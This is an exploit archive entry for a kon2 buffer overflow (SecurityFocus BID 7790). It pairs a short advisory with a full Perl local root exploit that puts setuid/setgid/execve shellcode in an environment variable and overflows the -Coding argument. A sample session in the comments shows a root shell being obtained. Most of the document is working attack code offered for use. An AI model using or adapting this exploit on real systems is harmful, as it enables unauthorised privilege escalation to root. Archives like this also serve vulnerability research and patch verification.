source: http://www.securityfocus.com/bid/7790/info

A buffer overflow vulnerability has been reported for the kon2 utility shipped with various Linux distributions. Exploitation of this vulnerability may result in a local attacker obtaining elevated privileges on a vulnerable system.

The vulnerability exists due to insufficient bounds checking performed on some commandline options passed to the vulnerable utility.

#!/usr/bin/perl
####################################################################################
#Priv8security.com kon2 version 0.3.9b-16 and < local root exploit.
#
#    Tested on Redhat 8.0. should work on 9.0 and 7.3
#    Bug happens on -Coding arg.
#    Based on Redhat Advisory.
#
#    [wsxz@localhost buffer]$ perl priv8kon.pl
#    -=[ Priv8security.com kon local root exploit ]=-
#    usage: priv8kon.pl offset
#    [+] Using ret shellcode 0xbfffffc6
#    Kanji ON Console ver.0.3.9 (2000/04/09)
#
#    KON> video type 'VGA' selected
#    KON> hardware scroll mode.
#    sh-2.05b# id
#    uid=0(root) gid=0(root) groups=500(wsxz)
####################################################################################


$shellcode =
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80".#setuid 0
"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80".#setgid 0
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69".
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

$path = "/usr/bin/kon";
$ret = 0xbffffffa - length($shellcode) - length($path);

$offset = $ARGV[0];

print "-=[ Priv8security.com kon2 local root exploit ]=-\n";
print "usage: $0 offset\n";
printf("[+] Using ret shellcode 0x%x\n",$ret + $offset);

$new_retword = pack('l', ($ret + $offset));
$buffer2 = "A" x 796;
$buffer2 .= $new_retword;
$buffer = $shellcode;
local($ENV{'WSXZ'}) = $buffer;
exec("$path -Coding $buffer2");